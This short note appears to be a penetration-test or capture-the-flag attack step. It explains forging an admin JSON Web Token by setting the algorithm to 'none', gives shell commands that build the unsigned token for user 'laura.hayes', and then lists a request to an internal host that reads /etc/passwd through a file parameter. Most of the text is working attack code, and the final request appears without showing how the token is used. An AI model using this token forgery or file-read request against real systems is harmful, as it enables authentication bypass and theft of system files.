ADMIN JWT VIA ALGORITHM CONFUSION (alg:none):

The JWT verifier does not enforce algorithm == HS256. Forge a token with
alg "none" and role "admin":

    H=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
    P=$(echo -n '{"sub":"laura.hayes","role":"admin","iat":1786130000,"exp":1786139000}' \
        | base64 -w0 | tr '+/' '-_' | tr -d '=')
    A="$H.$P."

        "http://10.48.132.72/api/files.php?name=/etc/passwd"
